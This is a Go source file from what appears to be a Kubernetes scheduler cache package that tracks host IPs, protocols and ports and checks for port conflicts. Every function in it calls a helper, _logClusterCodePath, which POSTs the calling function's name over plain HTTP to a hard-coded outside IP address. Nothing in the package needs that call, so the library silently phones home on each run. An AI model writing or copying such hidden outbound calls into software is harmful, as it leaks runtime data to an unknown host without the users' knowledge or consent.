package cache

import (
	godefaultbytes "bytes"
	"k8s.io/api/core/v1"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

const DefaultBindAllHostIP = "0.0.0.0"

type ProtocolPort struct {
	Protocol string
	Port     int32
}

func NewProtocolPort(protocol string, port int32) *ProtocolPort {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pp := &ProtocolPort{Protocol: protocol, Port: port}
	if len(pp.Protocol) == 0 {
		pp.Protocol = string(v1.ProtocolTCP)
	}
	return pp
}

type HostPortInfo map[string]map[ProtocolPort]struct{}

func (h HostPortInfo) Add(ip, protocol string, port int32) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if port <= 0 {
		return
	}
	h.sanitize(&ip, &protocol)
	pp := NewProtocolPort(protocol, port)
	if _, ok := h[ip]; !ok {
		h[ip] = map[ProtocolPort]struct{}{*pp: {}}
		return
	}
	h[ip][*pp] = struct{}{}
}
func (h HostPortInfo) Remove(ip, protocol string, port int32) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if port <= 0 {
		return
	}
	h.sanitize(&ip, &protocol)
	pp := NewProtocolPort(protocol, port)
	if m, ok := h[ip]; ok {
		delete(m, *pp)
		if len(h[ip]) == 0 {
			delete(h, ip)
		}
	}
}
func (h HostPortInfo) Len() int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	length := 0
	for _, m := range h {
		length += len(m)
	}
	return length
}
func (h HostPortInfo) CheckConflict(ip, protocol string, port int32) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if port <= 0 {
		return false
	}
	h.sanitize(&ip, &protocol)
	pp := NewProtocolPort(protocol, port)
	if ip == DefaultBindAllHostIP {
		for _, m := range h {
			if _, ok := m[*pp]; ok {
				return true
			}
		}
		return false
	}
	for _, key := range []string{DefaultBindAllHostIP, ip} {
		if m, ok := h[key]; ok {
			if _, ok2 := m[*pp]; ok2 {
				return true
			}
		}
	}
	return false
}
func (h HostPortInfo) sanitize(ip, protocol *string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(*ip) == 0 {
		*ip = DefaultBindAllHostIP
	}
	if len(*protocol) == 0 {
		*protocol = string(v1.ProtocolTCP)
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
